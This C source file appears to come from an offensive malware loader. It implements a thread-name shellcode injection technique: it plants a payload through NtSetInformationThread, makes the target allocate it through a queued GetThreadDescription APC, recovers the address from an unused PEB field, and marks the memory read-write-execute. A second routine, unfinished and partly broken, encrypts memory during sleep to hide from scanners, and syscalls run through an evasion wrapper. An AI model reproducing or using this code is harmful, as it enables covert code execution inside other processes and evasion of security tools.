/*
*   Description: ThreadName alloc/writing & Heap encryption
*/

// TODO: Sleep obfuscation

#include <windows.h>
#include <unwin.h>

#include <stdio.h>

#include "../syscalls/syscalls.h"
#include "../debugging/debugging.h"
#include "memory.h"

#define UNSED_PEB_FIELD 0x340

extern Ade GlobalAde;
static NTSTATUS status;

typedef NTSTATUS(WINAPI* _SystemFunction033)(
	UNICODE_STRING *memoryRegion,
	UNICODE_STRING *keyPointer
);

typedef struct TEMP_DATA_CALL_ {
    LPVOID Address;
    SIZE_T Size; 
} TEMP_DATA_CALL;

NTSTATUS CustomSetThreadDescription(HANDLE hThread, BYTE* buf, SIZE_T bufSize) {
    AdeSinner      sinner;
    UNICODE_STRING bufString;

    //
    // Make a buffer full of 0x01 
    //
    BYTE* backet = calloc(bufSize + sizeof(WCHAR), 1);
    memset(backet, 0x01, bufSize);

    //
    // Init the Unicode string
    //
    RtlInitUnicodeString(&bufString, (PWCHAR)backet);

    //
    // Copy the original buffer into the UNICODE_STRING
    //
    memcpy(bufString.Buffer, buf, bufSize);

    //
    // Set the thread-name
    //
    CallAde(sinner, "NtSetInformationThread", status,
        hThread,
        ThreadNameInformation,
        &bufString,
        sizeof(UNICODE_STRING)
    );

    return status;
}

WINBOOL ThreadNameAlloc(
    HANDLE hProcess,
    PBYTE shellcode,
    size_t shellcodeSize,
    MEMORY_ALLOC* MemoryAllocOut 
) {
    TEMP_DATA_CALL            tempDataCall;
    AdeSinner                 sinner;
    ULONG_PTR                 pebField; // UNUSED PEB FIELD
    PPEB                      ptrPeb;
    PROCESS_BASIC_INFORMATION pbi;

    //
    // Get remote process information
    //
    status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof( PROCESS_BASIC_INFORMATION ),
        NULL
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("NtQueryInformationProcess: 0x%lx", status);
        return FALSE;
    }

    //
    // Get remote PEB
    //
    ptrPeb   = pbi.PebBaseAddress;

    //
    // Set a unsed field for passing information
    //
    pebField = (ULONG_PTR) ptrPeb + UNSED_PEB_FIELD;

    //
    // Create new thread for the purpose of calling: `GetThreadDescription`
    //
    HANDLE hThread;

    CallAde(sinner, "NtCreateThreadEx", status,
        &hThread,
        THREAD_ALL_ACCESS,
        (POBJECT_ATTRIBUTES) NULL,
        hProcess,
        (PUSER_THREAD_START_ROUTINE) ExitThread,
        (PVOID) NULL,
        CREATE_SUSPENDED,
        (ULONG) 0,
        (SIZE_T) 0,
        (SIZE_T) 0,
        (PPS_ATTRIBUTE_LIST) NULL
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("NtCreateThreadEx: 0x%lx", status);
        return FALSE;
    }

    // Set the shellcode into the thread-name 
    //
    status = CustomSetThreadDescription(
        hThread,
        shellcode,
        shellcodeSize
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("CustomSetThreadDescription: 0x%lx", status);
        return FALSE;
    }

    // 
    // Call `GetThreadDescription` and orbain the new allocation addr into the PEB field
    //
    CallAde(sinner, "NtQueueApcThread", status,
        hThread,
        (PPS_APC_ROUTINE) GetThreadDescription,
        (void*) NtCurrentThread,
        (void*) pebField,
        0
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("NtQueueApcThread: 0x%lx", status);
        return FALSE;
    }

    //
    // Execute the APC chain and wait
    //
    ResumeThread(hThread);
    WaitForSingleObject(hThread, INFINITE);

    //
    // Read the new allocation addr into PEB field
    //
    void* ptrShellcode   = NULL;
    CallAde(sinner, "NtReadVirtualMemory", status,
        hProcess,
        (LPVOID)pebField,
        &ptrShellcode,
        sizeof(void*),
        NULL
    );

    if (ptrShellcode == NULL) {
        DEBUG_ERROR("ReadProcessMemory: 0x%lx", GetLastError());
        DEBUG_ERROR("REMOTE SHELLCODE: 0x%p", ptrShellcode);
        return FALSE;
    }

    //
    // Set to RWX
    //
    DWORD oldProtection   = 0x0;
    tempDataCall.Address  = ptrShellcode;
    tempDataCall.Size     = shellcodeSize;
    CallAde(sinner, "NtProtectVirtualMemory", status,
        hProcess,
        &tempDataCall.Address,
        &tempDataCall.Size,
        PAGE_EXECUTE_READWRITE,
        &oldProtection
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("NtProtectVirtualMemory: 0x%lx", status);
        return FALSE;
    }

    MemoryAllocOut->executionAddr = ptrShellcode;
    
    return TRUE;
}

//
// Stack & Heap encryption - TODO: finish and try
//
WINBOOL SleepObf(HANDLE hProcess, LPVOID ptrRegion, SIZE_T regionSize, ULONG time, UNICODE_STRING key) {
    TEMP_DATA_CALL tempDataCall;
    AdeSinner      sinner;

    _SystemFunction033 SystemFunction033 = (_SystemFunction033) 
        GetProcAddress( LoadLibraryA("advapi32.dll"), "SystemFunction033" );

    // +==============+
    //    Encryption
    // +==============+

    //
    // Read the region to encrypt
    //
    PBYTE regionData = malloc(regionSize);
    CallAde(sinner, "NtReadVirtualMemory", status,
        hProcess,
        ptrRegion,
        regionData,
        regionSize,
        NULL
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("NtReadVirtualMemory: 0x%lx", status);
        return FALSE;
    }

    //
    // Create the encryotion/decryption buffer
    //
    UNICODE_STRING buffer = {
        .Buffer = ptrRegion, // <==
        .Length = regionSize,
        .MaximumLength = regionSize
    };

    //
    // Encrypt the region-data FIX: crash
    //
    status = SystemFunction033(
        &buffer,
        &key
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("SystemFunction033: 0x%lx", status);
        return FALSE;
    }

    //
    // Write the encrypted region-data
    //

    CallAde(sinner, "NtWriteVirtualMemory", status,
        hProcess,
        ptrRegion,
        regionData,
        regionSize,
        NULL
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("NtWriteVirtualMemory: 0x%lx", status);
        return FALSE;
    }

    //
    // Wait X time
    //

    free(regionData);
    Sleep(time);

    // +==============+
    //    Decryption
    // +==============+

    //
    // Read the region to decrypt
    //
    regionData = malloc(regionSize);
    CallAde(sinner, "NtReadVirtualMemory", status,
        hProcess,
        ptrRegion,
        regionData,
        regionSize,
        NULL
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("NtReadVirtualMemory: 0x%lx", status);
        return FALSE;
    }

    //
    // Modify the encryption/decryption buffer
    //

    buffer.Buffer = ptrRegion;
    
    //
    // Decrypt the region-data
    //

    status = SystemFunction033(
        &buffer,
        &key
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("SystemFunction033: 0x%lx", status);
        return FALSE;
    }

    //
    // Write decrypted region-data
    //

    CallAde(sinner, "NtWriteVirtualMemory", status,
        hProcess,
        ptrRegion,
        regionData,
        regionSize,
        NULL

    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("NtWriteVirtualMemory: 0x%lx", status);
        return FALSE;
    }

    return TRUE;
}
